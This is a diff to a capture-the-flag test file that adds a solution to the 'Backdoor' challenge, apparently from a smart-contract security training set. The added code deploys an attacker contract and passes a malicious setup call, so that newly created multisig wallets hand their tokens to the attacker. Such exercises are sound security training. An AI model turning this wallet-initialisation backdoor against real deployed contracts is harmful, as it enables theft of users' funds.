@@ -37,6 +37,51 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // 1. Create a new wallet with owners [alice, attacker] 
+        // 2. Initiase wallet with backdoor module which allows 0 signature interactions
+        // 3. Once created, verify wallet has 10 tokens
+        // 4. Execute transaction on module contract to transfer tokens to attacker
+        // 5. Repeat x4
+
+        const attackerToken = this.token.connect(attacker);
+        const attackerFactory = this.walletFactory.connect(attacker);
+        const attackerMasterCopy = this.masterCopy.connect(attacker);
+        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+
+        // Helper Function
+        const checkTokenBalance = async (address, name) => {
+            const tokenBal = await attackerToken.balanceOf(address);
+
+            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
+        }
+
+        await checkTokenBalance(attacker.address, "Attacker");
+
+        // Deploy attacking contract
+        const AttackModuleFactory = await ethers.getContractFactory("AttackModule", attacker);
+        const attackModule = await AttackModuleFactory.deploy(
+            attacker.address,
+            attackerFactory.address,
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address
+        );
+        console.log("Deployed attacking module at", attackModule.address);
+
+        // ABI call to setupToken() which is malicious
+        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
+        const moduleIFace = new ethers.utils.Interface(moduleABI);
+        const setupData = moduleIFace.encodeFunctionData("setupToken", [
+            attackerToken.address, 
+            attackModule.address
+        ])
+
+        // Do exploit in one transaction (after contract deployment)
+        await attackModule.exploit(users, setupData);
+        
+        await checkTokenBalance(attacker.address, "Attacker");
+
     });
 
     after(async function () {
